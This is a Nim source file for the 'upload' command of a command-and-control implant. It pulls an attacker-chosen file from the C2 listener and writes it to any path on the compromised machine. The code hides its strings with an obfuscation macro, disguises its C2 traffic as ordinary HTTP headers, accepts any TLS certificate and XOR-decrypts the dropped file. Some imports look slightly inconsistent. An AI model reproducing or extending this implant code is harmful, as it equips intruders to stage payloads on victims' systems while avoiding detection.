from ../../core/webClientListener import Listener
from os import getcurrentdir, `/`
from strutils import join, split, toLowerAscii
from zippy import uncompress
import ../../util/crypto
import ../../util/strenc  # Import the module containing the obf macro
import puppy
import base64

# Upload a file from the C2 server to the Implant
# From Implant's perspective this is similar to wget, but calling to the C2 server instead
# 
# Security Features:
# - The filename is encrypted using XOR encryption with the implant's key
# - The server sends the encrypted filename in the X-Original-Filename header
# - The implant decrypts the filename before saving the file
# - This ensures the original filename is protected during transmission
#
# Process:
# 1. Server encrypts the original filename using the implant's XOR key
# 2. Server sends the encrypted filename in the X-Original-Filename header
# 3. Implant receives the encrypted filename and decrypts it using its XOR key
# 4. Implant uses the decrypted filename to save the file locally
#
# Note: The server should ALWAYS provide the X-Original-Filename header.
# If the header is missing, it indicates a potential security issue or server misconfiguration.
proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
    var 
        fileId : string
        url : string
    
    # Verify arguments
    echo obf("DEBUG Upload: Received args: ") & $args.len & obf(" - ") & $args
    
    if args.len == 0 or args[0] == "":
        return obf("Invalid number of arguments received. Usage: 'upload [file_id]'.")
    
    # Get the file hash ID
    fileId = args[0]
    echo obf("DEBUG Upload: fileId: ") & fileId
    
    # Build URL with fileId
    url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.implantCallbackIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/") & fileId
    
    echo obf("DEBUG Upload: Requesting file from URL: ") & url

    # Get the file
    let req = Request(
        url: parseUrl(url),
        headers: @[
                Header(key: obf("User-Agent"), value: li.userAgent),
                Header(key: obf("X-Request-ID"), value: li.id),
                Header(key: obf("Content-MD5"), value: cmdGuid),
                Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
            ],
        allowAnyHttpsCertificate: true,
    )
    let res: Response = fetch(req)

    # Check the result
    if res.code != 200:
        return obf("Error uploading file: Server returned code ") & $res.code
    
    # Log status code for debugging
    echo obf("DEBUG Upload: Response status: ") & $res.code
    
    # Process file content
    var dec = decryptData(res.body, li.UNIQUE_XOR_KEY)
    var decStr: string = cast[string](dec)
    var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))

    # CRITICAL: Get the filename from header
    var finalPath: string
    try:
        let encryptedFilename = base64.decode(res.headers["X-Original-Filename"])
        let serverFilename = decryptData(encryptedFilename, li.UNIQUE_XOR_KEY)
        echo obf("DEBUG Upload: Decrypted original filename: ") & serverFilename
        
        # Determine final path - always use the filename from server
        finalPath = serverFilename
        
        # If path is not absolute, prefix with current directory
        if not (finalPath.startsWith("/") or (finalPath.len >= 2 and finalPath[1] == ':')):
            finalPath = getCurrentDir() / serverFilename
            
        echo obf("DEBUG Upload: Final path for file: ") & finalPath
        
        # Ensure directory exists
        try:
            let dirPath = os.parentDir(finalPath)
            if dirPath != "" and not os.dirExists(dirPath):
                os.createDir(dirPath)
        except:
            echo obf("DEBUG Upload: Warning - Could not create parent directories")
            
    except:
        return obf("Error: Server did not provide valid filename in X-Original-Filename header")

    # Save file
    finalPath.writeFile(fileBuffer)
    return obf("Uploaded file to '") & finalPath & obf("'.")